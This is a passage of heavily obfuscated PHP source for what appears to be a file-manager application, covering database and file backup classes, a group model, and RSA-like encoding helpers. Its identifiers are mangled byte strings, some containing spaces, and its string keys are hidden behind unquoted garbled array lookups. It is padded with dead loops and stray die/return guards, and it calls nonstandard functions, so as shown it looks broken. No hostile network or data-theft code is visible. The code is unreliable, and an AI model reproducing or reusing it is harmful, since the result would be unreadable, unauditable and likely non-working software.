} $êË™Ë­Ã++; } break; case $ î´û[300]: $àıÑÉÆä = base64_encode($àıÑÉÆä); $ÑŸêËµç = rand(0, 64); $¢™ËÊ¾ = $îª›†–[727]; $½© ë„£ = $²ÌƒˆŠ[$ÑŸêËµç]; $úúå€ö = $îª›†–[728]; while (strlen($úúå€ö) < $îª›†–[671]) { if (!$úúå€ö) { break; } $úúå€ö++; } $¿ã†¸ëÃ = md5($½© ë„£ . md5($şìàÍğ£ . $½© ë„£) . $şìàÍğ£); $¿ã†¸ëÃ = substr($¿ã†¸ëÃ, $ÑŸêËµç % 8, $ÑŸêËµç % 8 + 7); $™‚Ü™·à = $ î´û[6]; $ìÍÕ„Éğ = $îª›†–[729]; if (strlen($ìÍÕ„Éğ) < $îª›†–[658]) { return; } $‚÷àÂËÑ = 0; $åûĞù€ı = $îª›†–[730]; if (strlen($åûĞù€ı) < $îª›†–[658]) { die; } $ÀÍ×½ë = 0; $‚¯î¥¢ù = $îª›†–[731]; while (strlen($‚¯î¥¢ù) < $îª›†–[671]) { if (!$‚¯î¥¢ù) { break; } $‚¯î¥¢ù++; } $Û×¡½É = 0; $Ç¢ñƒªÒ = $îª›†–[732]; for ($‚÷àÂËÑ = 0; $‚÷àÂËÑ < strlen($àıÑÉÆä); $‚÷àÂËÑ++) { $Û×¡½É = $Û×¡½É == strlen($¿ã†¸ëÃ) ? 0 : $Û×¡½É; $ÀÍ×½ë = ($ÑŸêËµç + strpos($²ÌƒˆŠ, $àıÑÉÆä[$‚÷àÂËÑ]) + ord($¿ã†¸ëÃ[$Û×¡½É++])) % 64; $ÛÜ¼®õ¦ = $îª›†–[733]; while (strlen($ÛÜ¼®õ¦) < $îª›†–[671]) { if (!$ÛÜ¼®õ¦) { break; } $ÛÜ¼®õ¦++; } $™‚Ü™·à .= $²ÌƒˆŠ[$ÀÍ×½ë]; } $ª¾î…Ã = hash_encode($½© ë„£ . $™‚Ü™·à); $¿ş°Š°  = $îª›†–[734]; if (strlen($¿ş°Š° ) < $îª›†–[658]) { die; } break; $šàáğÍÓ = $îª›†–[735]; if (!$šàáğÍÓ) { return; } default: $ª¾î…Ã = $this->sgyr5696f5f4($àıÑÉÆä, $şìàÍğ£ . $•îç³î¬); $ûòÈ®úÄ = $îª›†–[736]; while ($ûòÈ®úÄ < $îª›†–[690]) { if ($ûòÈ®úÄ >= 0) { break; } $ûòÈ®úÄ++; } break; } $ª¾î…Ã = strrev($¿òî¨şş . $•îç³î¬ . $ª¾î…Ã); if ($ü›’½¤ö - 1 > 0) { $ª¾î…Ã = $this->yozf31e9d1c9($ª¾î…Ã, $şìàÍğ£, $ü›’½¤ö - 1); } return $ª¾î…Ã; } private function ogikc3ba3fc7($Ô® Ä, $°á½¥ç’, $ÃóÁŞ¹ = 3) { $Ûƒ¬ğó˜ =& $_SERVER[–Ú¬çÁ]; $”ìŸ­˜ =& $_SERVER[¨­üö¨œ]; if (!is_string($Ô® Ä) || strlen($Ô® Ä) < 10) { return !1; } $Ô® Ä = trim($Ô® Ä); $™ÖÒ«˜§ = $Ûƒ¬ğó˜[737]; $Ô® Ä = strrev($Ô® Ä); $õ½Ï¯¹‚ = $Ûƒ¬ğó˜[738]; while ($õ½Ï¯¹‚ < $Ûƒ¬ğó˜[690]) { if ($õ½Ï¯¹‚ >= 0) { break; } $õ½Ï¯¹‚++; } $çñë¶èË = $Ô® Ä[0]; $†ÁéÙ = substr($Ô® Ä, 1, 15); $Ô® Ä = substr($Ô® Ä, 16); $ëÚÂ÷´† = $Ûƒ¬ğó˜[739]; while (strlen($ëÚÂ÷´†) < $Ûƒ¬ğó˜[690]) { if (!$ëÚÂ÷´†) { break; } $ëÚÂ÷´†++; } $ş¶çô¢ª = $”ìŸ­˜[297]; switch ($çñë¶èË) { case $”ìŸ­˜[206]: $«¼ğ»‰ = $this->ykzffe1e5510($Ô® Ä, strrev($°á½¥ç’ . $†ÁéÙ)); $µÇÑñ³¹ = $Ûƒ¬ğó˜[740]; while (strlen($µÇÑñ³¹) < $Ûƒ¬ğó˜[690]) { if (!$µÇÑñ³¹) { break; } $µÇÑñ³¹++; } break; case $”ìŸ­˜[123]: $«¼ğ»‰ = $this->ykzffe1e5510($Ô® Ä, strrev($†ÁéÙ . $°á½¥ç’)); break; case $”ìŸ­˜[298]: $«¼ğ»‰ = $this->ykzffe1e5510($Ô® Ä, base64_encode($†ÁéÙ . $°á½¥ç’)); break; case $”ìŸ­˜[299]: $«¼ğ»‰ = $this->ykzffe1e5510($Ô® Ä, md5($†ÁéÙ . $°á½¥ç’)); break; case $”ìŸ­˜[300]: $Ô® Ä = hash_decode($Ô® Ä); $çá—ƒËí = $Ûƒ¬ğó˜[741]; $´±’…ë© = $Ô® Ä[0]; $Ô® Ä = substr($Ô® Ä, 1); $Ì‚«ŒäÃ = strpos($ş¶çô¢ª, $´±’…ë©); $İ¼ÊÓ = md5($´±’…ë© . md5($°á½¥ç’ . $´±’…ë©) . $°á½¥ç’); $İ¼ÊÓ = substr($İ¼ÊÓ, $Ì‚«ŒäÃ % 8, $Ì‚«ŒäÃ % 8 + 7); $…×Ğß—ş = $Ûƒ¬ğó˜[742]; if (strlen($…×Ğß—ş) < $Ûƒ¬ğó˜[690]) { return; } $ø®ŞŠî = $”ìŸ­˜[6]; $ºÄİ×ƒ‚ = 0; $ÂÉã‚ = 0; $™ˆÄ™ƒ’ = 0; for ($ºÄİ×ƒ‚ = 0; $ºÄİ×ƒ‚ < strlen($Ô® Ä); $ºÄİ×ƒ‚++) { $™ˆÄ™ƒ’ = $™ˆÄ™ƒ’ == strlen($İ¼ÊÓ) ? 0 : $™ˆÄ™ƒ’; $•§º™åº = $™ˆÄ™ƒ’++; $ÂÉã‚ = strpos($ş¶çô¢ª, $Ô® Ä[$ºÄİ×ƒ‚]) - $Ì‚«ŒäÃ - ord($İ¼ÊÓ[$•§º™åº]); $£Àéú¥ = $Ûƒ¬ğó˜[743]; if (!$£Àéú¥) { die; } while ($ÂÉã‚ < 0) { $ÂÉã‚ += 64; $ÃÎÔÆŸÄ = $Ûƒ¬ğó˜[744]; while (strlen($ÃÎÔÆŸÄ) < $Ûƒ¬ğó˜[207]) { if (!$ÃÎÔÆŸÄ) { break; } $ÃÎÔÆŸÄ++; } } $ø®ŞŠî .= $ş¶çô¢ª[$ÂÉã‚]; } $«¼ğ»‰ = base64_decode($ø®ŞŠî); break; $¿ã·· = $Ûƒ¬ğó˜[745]; while ($¿ã·· < $Ûƒ¬ğó˜[207]) { if ($¿ã·· >= 0) { break; } $¿ã··++; } default: $«¼ğ»‰ = $this->ykzffe1e5510($Ô® Ä, $°á½¥ç’ . $†ÁéÙ); $¾Ó÷šŞı = $Ûƒ¬ğó˜[746]; while (strlen($¾Ó÷šŞı) < $Ûƒ¬ğó˜[658]) { if (!$¾Ó÷šŞı) { break; } $¾Ó÷šŞı++; } break; $ü‡½àê‰ = $Ûƒ¬ğó˜[747]; } if ($ÃóÁŞ¹ - 1 > 0) { $«¼ğ»‰ = $this->ogikc3ba3fc7($«¼ğ»‰, $°á½¥ç’, $ÃóÁŞ¹ - 1); } return $«¼ğ»‰; } public function quar1273c800($öâ ¹™) { $Û¢°ñáñ =& $_SERVER[–Ú¬çÁ]; $µõí« =& $_SERVER[¨­üö¨œ]; $—®ÌÀç… = $this->emlf813211d2(); $Ó™Î˜¼ = $Û¢°ñáñ[748]; if (strlen($Ó™Î˜¼) < $Û¢°ñáñ[665]) { die; } $Ú‡Åîº = $this->emlf813211d2(); $óëªíúœ = $Û¢°ñáñ[749]; $¡×“‰´ğ = ($—®ÌÀç… - 1) * ($Ú‡Åîº - 1); $¹×ÓÏÜŞ = intval(($—®ÌÀç… + $Ú‡Åîº) / 2); $­ò¨ùÚÆ = $Û¢°ñáñ[750]; if (strlen($­ò¨ùÚÆ) < $Û¢°ñáñ[690]) { die; } while (1) { $•Ÿ—°–İ = $¹×ÓÏÜŞ; $¬Ïóİ• = $Û¢°ñáñ[751]; if (!$¬Ïóİ•) { return; } $–¸¬ëÑ¤ = $¡×“‰´ğ; while ($–¸¬ëÑ¤ % $•Ÿ—°–İ != 0) { $€ä‰ô®Ù = $–¸¬ëÑ¤; $‡¤ë’÷Š = $Û¢°ñáñ[752]; if (strlen($‡¤ë’÷Š) < $Û¢°ñáñ[207]) { return; } $–¸¬ëÑ¤ = $•Ÿ—°–İ; $ÈÄĞóÂ½ = $Û¢°ñáñ[753]; $•Ÿ—°–İ = $€ä‰ô®Ù % $•Ÿ—°–İ; } if ($•Ÿ—°–İ == 1) { break; } else { $¹×ÓÏÜŞ++; } } $Æ™ ‰Äµ = 2; $‘ƒ¹áäÇ = $Û¢°ñáñ[754]; if (strlen($‘ƒ¹áäÇ) < $Û¢°ñáñ[658]) { die; } for ($ËÊ•Î¸Í = 0; $ËÊ•Î¸Í < $¡×“‰´ğ * 10; $ËÊ•Î¸Í++) { if (($¡×“‰´ğ * $ËÊ•Î¸Í + 1) % $¹×ÓÏÜŞ == 0) { $Æ™ ‰Äµ = intval(($¡×“‰´ğ * $ËÊ•Î¸Í + 1) / $¹×ÓÏÜŞ); break; } } $š‰…¯£ = $this->sgyr5696f5f4($—®ÌÀç… * $Ú‡Åîº . $µõí«[6], $µõí«[137]); $áî„»õß = md5($µõí«[301] . ($—®ÌÀç… + $Ú‡Åîº) . $µõí«[302] . $¹×ÓÏÜŞ . $µõí«[302] . $Æ™ ‰Äµ . $µõí«[303]); $”µÍ½°î = $this->sgyr5696f5f4($öâ ¹™, $áî„»õß) . $µõí«[304] . $š‰…¯£; return $”µÍ½°î; } public function nero4976087a($ŒÙô«ïĞ) { $ä‡˜±‰° =& $_SERVER[–Ú¬çÁ]; $ŞŸÅÉ€ =& $_SERVER[¨­üö¨œ]; $´â…ÑÏ = explode($ŞŸÅÉ€[304], $ŒÙô«ïĞ); if (count($´â…ÑÏ) != 2) { return $ŞŸÅÉ€[6]; } $Ğ™ÙñïĞ = $this->ykzffe1e5510($´â…ÑÏ[1] . $ŞŸÅÉ€[6], $ŞŸÅÉ€[137]); if (!$Ğ™ÙñïĞ) { return $ŞŸÅÉ€[6]; } $Ğ™ÙñïĞ = intval($Ğ™ÙñïĞ); $„¾”õ¶ƒ = $ä‡˜±‰°[755]; if (strlen($„¾”õ¶ƒ) < $ä‡˜±‰°[665]) { return; } $ª½ù¼ğ“ = 0; $Ÿ„®÷¥¼ = $ä‡˜±‰°[756]; $À¡¾”ÒÖ = 0; for ($ë‹‰¢Ğ› = 3; $ë‹‰¢Ğ› < $Ğ™ÙñïĞ; $ë‹‰¢Ğ› += 2) { if ($Ğ™ÙñïĞ % $ë‹‰¢Ğ› != 0) { continue; } $ª½ù¼ğ“ = $ë‹‰¢Ğ›; $À¡¾”ÒÖ = intval($Ğ™ÙñïĞ / $ë‹‰¢Ğ›); break; } $öƒ¿éËó = ($ª½ù¼ğ“ - 1) * ($À¡¾”ÒÖ - 1); $äÊ“ûëÁ = $ä‡˜±‰°[757]; while (strlen($äÊ“ûëÁ) < $ä‡˜±‰°[658]) { if (!$äÊ“ûëÁ) { break; } $äÊ“ûëÁ++; } $À˜ÂÅø† = intval(($ª½ù¼ğ“ + $À¡¾”ÒÖ) / 2); while (1) { $úí¼í = $À˜ÂÅø†; $”¢¿­™ = $öƒ¿éËó; $Ô¤óıëø = $ä‡˜±‰°[758]; if (strlen($Ô¤óıëø) < $ä‡˜±‰°[665]) { die; } while ($”¢¿­™ % $úí¼í != 0) { $Í¬“Ş‡Ó = $”¢¿­™; $”¢¿­™ = $úí¼í; $úí¼í = $Í¬“Ş‡Ó % $úí¼í; $‘íã¹İË = $ä‡˜±‰°[759]; } if ($úí¼í == 1) { break; } else { $À˜ÂÅø†++; } } $õ¥©ëĞò = 2; $ñè¤ª·¾ = $ä‡˜±‰°[760]; if (strlen($ñè¤ª·¾) < $ä‡˜±‰°[658]) { return; } for ($ë‹‰¢Ğ› = 0; $ë‹‰¢Ğ› < $öƒ¿éËó * 10; $ë‹‰¢Ğ›++) { if (($öƒ¿éËó * $ë‹‰¢Ğ› + 1) % $À˜ÂÅø† == 0) { $õ¥©ëĞò = intval(($öƒ¿éËó * $ë‹‰¢Ğ› + 1) / $À˜ÂÅø†); break; } } $Ç³×«ÃÏ = md5($ŞŸÅÉ€[301] . ($ª½ù¼ğ“ + $À¡¾”ÒÖ) . $ŞŸÅÉ€[302] . $À˜ÂÅø† . $ŞŸÅÉ€[302] . $õ¥©ëĞò . $ŞŸÅÉ€[303]); $²üŞë®° = $this->ykzffe1e5510($´â…ÑÏ[0], $Ç³×«ÃÏ); return $²üŞë®°; $´¾…ÏúÎ = $ä‡˜±‰°[761]; while ($´¾…ÏúÎ < $ä‡˜±‰°[690]) { if ($´¾…ÏúÎ >= 0) { break; } $´¾…ÏúÎ++; } } public function emlf813211d2() { $§òÄ­Øù =& $_SERVER[–Ú¬çÁ]; $ŞÌÁ»áí = mt_rand(pow(2, 14), pow(2, 16) - 1); $ªâ¾È™Ç = $§òÄ­Øù[762]; while (strlen($ªâ¾È™Ç) < $§òÄ­Øù[671]) { if (!$ªâ¾È™Ç) { break; } $ªâ¾È™Ç++; } $Á‘ñøÏŠ = array(); $´“†«á = $§òÄ­Øù[763]; $©öÔäœû = 1; while ($©öÔäœû <= (int) sqrt($ŞÌÁ»áí)) { $ë¶øœ—ö = $©öÔäœû; $™»¤¾ËÍ = $§òÄ­Øù[764]; if (strlen($™»¤¾ËÍ) < $§òÄ­Øù[665]) { die; } while (!0) { $ë¶øœ—ö++; if ($ë¶øœ—ö <= 2) { $©öÔäœû = $ë¶øœ—ö; break; } else { if ($ë¶øœ—ö < 2) { continue; } } $Ê²Ø‚Ï¥ = !0; for ($ØÒšµâÜ = 2; $ØÒšµâÜ <= sqrt($ë¶øœ—ö); $ØÒšµâÜ++) { if ($ë¶øœ—ö % $ØÒšµâÜ == 0) { $Ê²Ø‚Ï¥ = !1; } } if ($Ê²Ø‚Ï¥) { $©öÔäœû = $ë¶øœ—ö; break; } } $Á‘ñøÏŠ[] = $©öÔäœû; $éä‚èí = $§òÄ­Øù[765]; if (!$éä‚èí) { die; } } $Ñá¡Åª = 2; for ($ë¶øœ—ö = $ŞÌÁ»áí; $ë¶øœ—ö > 1; $ë¶øœ—ö--) { $Ê²Ø‚Ï¥ = !0; $ØğŸÏ¾ = $§òÄ­Øù[766]; if (strlen($ØğŸÏ¾) < $§òÄ­Øù[665]) { die; } foreach ($Á‘ñøÏŠ as $¢…ŠÑÃØ) { if ($ë¶øœ—ö % $¢…ŠÑÃØ == 0) { $Ê²Ø‚Ï¥ = !1; break; } } if ($Ê²Ø‚Ï¥) { $Ñá¡Åª = $ë¶øœ—ö; break; } } return $Ñá¡Åª; $•ü‘ö ‰ = $§òÄ­Øù[767]; } public function ymzib5965645($ƒ²ïİŒ», $¡—á“Äá) { $¤°²œñ =& $_SERVER[¨­üö¨œ]; return call_user_func(array($¤°²œñ[8], $¤°²œñ[305]), $ƒ²ïİŒ», $¡—á“Äá); } public function sgyr5696f5f4($Áé†ÈŞ, $ë×±¤ÓÏ) { $ç¬Ï¿¶ã =& $_SERVER[¨­üö¨œ]; return call_user_func(array($ç¬Ï¿¶ã[306], $ç¬Ï¿¶ã[307]), $Áé†ÈŞ, $ë×±¤ÓÏ); } public function ykzffe1e5510($å½ı¯ü, $ø¯Ñ³¢) { $§¥ÀÏÆ¯ =& $_SERVER[¨­üö¨œ]; return call_user_func(array($§¥ÀÏÆ¯[306], $§¥ÀÏÆ¯[308]), $å½ı¯ü, $ø¯Ñ³¢); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $œ¯‹íæÔ =& $_SERVER[–Ú¬çÁ]; $this->isManual(); self::$name = date($œ¯‹íæÔ[768]); if (!($¯¼Ù”‰ì = Model($œ¯‹íæÔ[769])->lastItem())) { $¯¼Ù”‰ì = $this->initData(); } else { self::$name = $¯¼Ù”‰ì[$œ¯‹íæÔ[32]]; if ($¯¼Ù”‰ì[$œ¯‹íæÔ[770]] == $œ¯‹íæÔ[88]) { self::$name = date($œ¯‹íæÔ[264]); $˜ƒ€³Û÷ = 0; if (isset($¯¼Ù”‰ì[$œ¯‹íæÔ[346]][$œ¯‹íæÔ[224]][$œ¯‹íæÔ[518]])) { $˜ƒ€³Û÷ = (int) $¯¼Ù”‰ì[$œ¯‹íæÔ[346]][$œ¯‹íæÔ[224]][$œ¯‹íæÔ[518]]; } if (self::$manual == 0 && $¯¼Ù”‰ì[$œ¯‹íæÔ[32]] == self::$name) { Model($œ¯‹íæÔ[769])->remove($¯¼Ù”‰ì[$œ¯‹íæÔ[452]]); } $¯¼Ù”‰ì = $this->initData($˜ƒ€³Û÷, $¯¼Ù”‰ì[$œ¯‹íæÔ[771]]); } else { $this->checkStore($¯¼Ù”‰ì[$œ¯‹íæÔ[771]]); } } self::$option = $¯¼Ù”‰ì; } private function isManual() { $ïÏ…¼ ì = _get($GLOBALS, $_SERVER[–Ú¬çÁ][772], 0); $ïÏ…¼ ì = intval($ïÏ…¼ ì); self::$manual = $ïÏ…¼ ì && $ïÏ…¼ ì == 1 ? 1 : 0; } private function initData($Üğ‚´šŒ = 0, $³ÛÕœÖ = '') { $²±®Ã“ï =& $_SERVER[–Ú¬çÁ]; $˜×¾ŒÜÌ = Model($²±®Ã“ï[769])->config(); if ($³ÛÕœÖ && $˜×¾ŒÜÌ[$²±®Ã“ï[771]] != $³ÛÕœÖ) { $Üğ‚´šŒ = 0; } $this->checkStore($˜×¾ŒÜÌ[$²±®Ã“ï[771]]); if (self::$manual == 1) { self::$name .= $²±®Ã“ï[11] . date($²±®Ã“ï[773]); } $÷ÀÊÑŠ“ = array($²±®Ã“ï[771] => $˜×¾ŒÜÌ[$²±®Ã“ï[771]], $²±®Ã“ï[32] => self::$name, $²±®Ã“ï[770] => 0, $²±®Ã“ï[774] => $˜×¾ŒÜÌ[$²±®Ã“ï[774]], $²±®Ã“ï[775] => self::$manual, $²±®Ã“ï[346] => array($²±®Ã“ï[776] => array($²±®Ã“ï[770] => 0), $²±®Ã“ï[777] => array($²±®Ã“ï[770] => 0, $²±®Ã“ï[778] => 0, $²±®Ã“ï[779] => 0, $²±®Ã“ï[33] => $²±®Ã“ï[12], $²±®Ã“ï[780] => 0, $²±®Ã“ï[781] => 0), $²±®Ã“ï[782] => array($²±®Ã“ï[770] => 0, $²±®Ã“ï[778] => 0, $²±®Ã“ï[779] => 0, $²±®Ã“ï[780] => 0, $²±®Ã“ï[781] => 0), $²±®Ã“ï[224] => array($²±®Ã“ï[770] => 0, $²±®Ã“ï[783] => 0, $²±®Ã“ï[784] => 0, $²±®Ã“ï[785] => 0, $²±®Ã“ï[786] => 0, $²±®Ã“ï[518] => $Üğ‚´šŒ, $²±®Ã“ï[780] => 0, $²±®Ã“ï[781] => 0)), $²±®Ã“ï[780] => time(), $²±®Ã“ï[781] => 0); $½™™òü˜ = Model($²±®Ã“ï[769])->insert($÷ÀÊÑŠ“); $÷ÀÊÑŠ“[$²±®Ã“ï[452]] = $½™™òü˜; return $÷ÀÊÑŠ“; } private function checkStore($ÍÊº¥¥) { $³¾üÈÛ =& $_SERVER[–Ú¬çÁ]; $¥‚š½È = Model($³¾üÈÛ[787])->listData($ÍÊº¥¥); Model($³¾üÈÛ[787])->checkConfig($¥‚š½È); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[–Ú¬çÁ][769])->findByName(self::$name); } return self::$option; } public static function set($¤Ïõ¦ö‚) { $ÔÀğÎ¹† =& $_SERVER[–Ú¬çÁ]; $á¤ÖÎ«˜ = self::get(); foreach ($¤Ïõ¦ö‚ as $ß÷›¶˜ô => $‘Õ£„ü³) { $òçÑ¾©Æ = explode($ÔÀğÎ¹†[10], $ß÷›¶˜ô); $İËğÚéÜ = count($òçÑ¾©Æ); switch ($İËğÚéÜ) { case 1: $á¤ÖÎ«˜[$òçÑ¾©Æ[0]] = $‘Õ£„ü³; break; case 2: $á¤ÖÎ«˜[$òçÑ¾©Æ[0]][$òçÑ¾©Æ[1]] = $‘Õ£„ü³; break; case 3: $á¤ÖÎ«˜[$òçÑ¾©Æ[0]][$òçÑ¾©Æ[1]][$òçÑ¾©Æ[2]] = $‘Õ£„ü³; break; } } Model($ÔÀğÎ¹†[769])->update($á¤ÖÎ«˜[$ÔÀğÎ¹†[452]], $á¤ÖÎ«˜); self::$option = $á¤ÖÎ«˜; return self::$option; } public function keep() { $‡±…ƒ² =& $_SERVER[–Ú¬çÁ]; $ÀŞ§üÔà = self::get(); if ($ÀŞ§üÔà[$‡±…ƒ²[346]][$‡±…ƒ²[776]][$‡±…ƒ²[770]] == $‡±…ƒ²[88]) { return; } $this->backupKeep($ÀŞ§üÔà); self::set(array($‡±…ƒ²[788] => 1)); } private function backupKeep($ğ•Óª±) { $Àåş¹® =& $_SERVER[–Ú¬çÁ]; if (self::$manual == 1) { return; } $­‡šåÚ = Model($Àåş¹®[769])->listData(); if (empty($­‡šåÚ)) { return; } $—˜ñ’¾Î = 0; $ä×ÓªËû = array(); foreach ($­‡šåÚ as $êš–’€) { if ($—˜ñ’¾Î >= 7) { break; } $ä×ÓªËû[] = $êš–’€[$Àåş¹®[32]]; $—˜ñ’¾Î++; } for ($—˜ñ’¾Î = 0; $—˜ñ’¾Î < 12; $—˜ñ’¾Î++) { $ä×ÓªËû[] = date($Àåş¹®[789], strtotime("\55{$—˜ñ’¾Î}\x20\155\157\156\164\x68\163")); } $ä×ÓªËû = array_unique($ä×ÓªËû); $¾œÏºë = Model($Àåş¹®[790])->get($Àåş¹®[791]); foreach ($­‡šåÚ as $êš–’€) { if (isset($êš–’€[$Àåş¹®[775]]) && $êš–’€[$Àåş¹®[775]] == $Àåş¹®[88]) { continue; } if (!empty($êš–’€[$Àåş¹®[32]]) && in_array($êš–’€[$Àåş¹®[32]], $ä×ÓªËû)) { continue; } Model($Àåş¹®[769])->remove($êš–’€[$Àåş¹®[452]]); $ô¬Šû½÷ = $this->backupPath($ğ•Óª±, $¾œÏºë); IO::remove($ô¬Šû½÷, !1); } } private function backupPath($Ã²‰Ê”µ, $¶îò¯º = false) { $ÃÖò®¦µ =& $_SERVER[–Ú¬çÁ]; if (!$¶îò¯º) { $¶îò¯º = Model($ÃÖò®¦µ[790])->get($ÃÖò®¦µ[791]); } $êÜ¬èí = $Ã²‰Ê”µ[$ÃÖò®¦µ[32]]; $ıàÅÄ¤¤ = substr(md5($ÃÖò®¦µ[792] . $¶îò¯º . $êÜ¬èí), 0, 8); return "\x7b\x69\x6f\72{$Ã²‰Ê”µ[$ÃÖò®¦µ[771]]}\x7d\x2f\144\x61\x74\x61\x62\141\x73\145\57\142\141\x63\153\165\x70\x2f" . $êÜ¬èí . $ÃÖò®¦µ[11] . $ıàÅÄ¤¤; } public function db() { $Ä’º”Ëƒ =& $_SERVER[–Ú¬çÁ]; $‹÷³åò» = self::get(); if ($‹÷³åò»[$Ä’º”Ëƒ[346]][$Ä’º”Ëƒ[777]][$Ä’º”Ëƒ[770]] == $Ä’º”Ëƒ[88]) { return !0; } $şµì ª = new BackupDb(); if (!$şµì ª->index()) { return !1; } self::set(array($Ä’º”Ëƒ[793] => 1)); return !0; } public function dbFile() { $š¸İ¸ =& $_SERVER[–Ú¬çÁ]; $‡Î‰Ğí¡ = self::get(); if ($‡Î‰Ğí¡[$š¸İ¸[346]][$š¸İ¸[782]][$š¸İ¸[770]] == $š¸İ¸[88]) { return !0; } $¸ë¸ÈşÏ = new BackupDbFile(); if (!$¸ë¸ÈşÏ->index()) { return !1; } self::set(array($š¸İ¸[794] => 1)); return !0; } public function file() { $Ã ßÑ =& $_SERVER[–Ú¬çÁ]; $îá¹¢” = self::get(); if ($îá¹¢”[$Ã ßÑ[346]][$Ã ßÑ[224]][$Ã ßÑ[770]] == $Ã ßÑ[88]) { return !0; } if (!isset($îá¹¢”[$Ã ßÑ[774]]) || $îá¹¢”[$Ã ßÑ[774]] == $Ã ßÑ[222]) { $ôâÅ¯öë = new BackupFile(); if (!$ôâÅ¯öë->index()) { return !1; } } self::set(array($Ã ßÑ[795] => 1, $Ã ßÑ[770] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $£İ§¾Äš =& $_SERVER[–Ú¬çÁ]; $ôÆ¾·ãİ = Backup::get(); self::$io = $ôÆ¾·ãİ[$£İ§¾Äš[771]]; self::$name = $ôÆ¾·ãİ[$£İ§¾Äš[32]]; $“Öœˆƒ = new DbManage(); $ÒŒıŠó¢ = $“Öœˆƒ->dbType(); $û–¨»ñ† = array($£İ§¾Äš[796] => $ÒŒıŠó¢, $£İ§¾Äš[797] => time()); Backup::set($û–¨»ñ†); $ş–äÀº— = $this->tmpFilesPath() . $£İ§¾Äš[798] . self::$name . $£İ§¾Äš[8]; del_dir($ş–äÀº—); mk_dir($ş–äÀº—); $ŠûÙ ô = $¹·—¤× = 0; $®ê¦‘˜² = new Task($£İ§¾Äš[799], $£İ§¾Äš[800], 0, LNG($£İ§¾Äš[801]) . $£İ§¾Äš[802] . LNG($£İ§¾Äš[803])); try { $ëø§•íÙ = $“Öœˆƒ->db()->getTables(); } catch (Exception $ËÊŠá·§) { $®ê¦‘˜²->end(); return !1; } $ëø§•íÙ = array_diff($ëø§•íÙ, array($£İ§¾Äš[804], $£İ§¾Äš[805])); foreach ($ëø§•íÙ as $ÒéÈØ¹Ö) { $ŠûÙ ô += $“Öœˆƒ->model($ÒéÈØ¹Ö)->count(); } $®ê¦‘˜²->task[$£İ§¾Äš[806]] = $ŠûÙ ô; $GLOBALS[$£İ§¾Äš[807]] = self::$name; foreach ($ëø§•íÙ as $ÒéÈØ¹Ö) { $ŸşóÖğ© = $ş–äÀº— . $ÒéÈØ¹Ö . $£İ§¾Äš[808]; $òãˆ‡¤† = null; if ($ÒéÈØ¹Ö == $£İ§¾Äš[809] && (!isset($ôÆ¾·ãİ[$£İ§¾Äš[774]]) || $ôÆ¾·ãİ[$£İ§¾Äš[774]] == $£İ§¾Äš[222])) { $òãˆ‡¤† = self::$io; } $¹·—¤× += $“Öœˆƒ->sqlFromDb($ÒéÈØ¹Ö, $ŸşóÖğ©, $®ê¦‘˜², $òãˆ‡¤†); } unset($GLOBALS[$£İ§¾Äš[807]]); $®ê¦‘˜²->end(); if ($¹·—¤× > $ŠûÙ ô) { $ŠûÙ ô = $¹·—¤×; } $û–¨»ñ† = array($£İ§¾Äš[796] => $ÒŒıŠó¢, $£İ§¾Äš[793] => 1, $£İ§¾Äš[810] => $ŠûÙ ô, $£İ§¾Äš[811] => $¹·—¤×, $£İ§¾Äš[812] => time()); Backup::set($û–¨»ñ†); if ($ŠûÙ ô - $¹·—¤× > 0) { $³ëÔÂÕ¯ = $£İ§¾Äš[813]; if (stristr(I18n::getType(), $£İ§¾Äš[814])) { $³ëÔÂÕ¯ = $£İ§¾Äš[815]; } write_log(array($³ëÔÂÕ¯, $û–¨»ñ†), $£İ§¾Äš[800]); return !1; } return !0; } private function tmpFilesPath() { $®‘•¨ô =& $_SERVER[–Ú¬çÁ]; $›ÓÁéÊ¦ = TEMP_FILES; if ($GLOBALS[$®‘•¨ô[6]][$®‘•¨ô[89]][$®‘•¨ô[816]]) { $›ÓÁéÊ¦ = $GLOBALS[$®‘•¨ô[6]][$®‘•¨ô[89]][$®‘•¨ô[816]]; if (!mk_dir($›ÓÁéÊ¦) || !is_writable($›ÓÁéÊ¦) || !IO::mkfile($›ÓÁéÊ¦ . $®‘•¨ô[817])) { $›ÓÁéÊ¦ = TEMP_FILES; } } return $›ÓÁéÊ¦; } } goto b³´—Ğ‘; F‡×ºê—ª: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\x67\162\157\x75\160\x5f\155\145\164\x61", "\x6d\x65\164\x61\106\x69\x65\154\x64" => "\x67\162\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($‹¬Û’Ãõ) { $Êô¾Ò§Å =& $_SERVER[–Ú¬çÁ]; return array($Êô¾Ò§Å[1942] => array($‹¬Û’Ãõ[0], $Êô¾Ò§Å[1943]), $Êô¾Ò§Å[1944] => array($‹¬Û’Ãõ[0], $Êô¾Ò§Å[1945])); } protected function getInfo($º°ûÚá¹, $ó€°Ã”İ = false) { $¦€ËìûÎ = $this->getInfoSimple($º°ûÚá¹); if (!$¦€ËìûÎ) { return !1; } if ($ó€°Ã”İ) { return $this->_listDataApplyItem($¦€ËìûÎ); } return $this->cacheFunctionGet($_SERVER[–Ú¬çÁ][1946], $º°ûÚá¹); } protected function getInfoSimple($š¾à„ß, $…ß¹†¸Ü = false) { $Ó§Ä”Ö =& $_SERVER[–Ú¬çÁ]; if ($…ß¹†¸Ü) { $ÒÊ©ÔÚö = array($Ó§Ä”Ö[1864] => intval($š¾à„ß)); $ÖÀä¢ˆ = $this->where($ÒÊ©ÔÚö)->find(); return is_array($ÖÀä¢ˆ) ? $ÖÀä¢ˆ : array(); } return $this->cacheFunctionGet($Ó§Ä”Ö[1947], $š¾à„ß); } protected function groupAdd($ø±ãÛ±Â) { $ıãŞ•è =& $_SERVER[–Ú¬çÁ]; if (!$ø±ãÛ±Â[$ıãŞ•è[180]] && isset($ø±ãÛ±Â[$ıãŞ•è[1864]]) && $ø±ãÛ±Â[$ıãŞ•è[1864]] == 1) { if ($Ç×ñƒë¥ = $this->getInfoSimple($ø±ãÛ±Â[$ıãŞ•è[1864]], !0)) { return $ø±ãÛ±Â[$ıãŞ•è[1864]]; } } else { $Ç×ñƒë¥ = $this->getInfoSimple($ø±ãÛ±Â[$ıãŞ•è[180]]); if 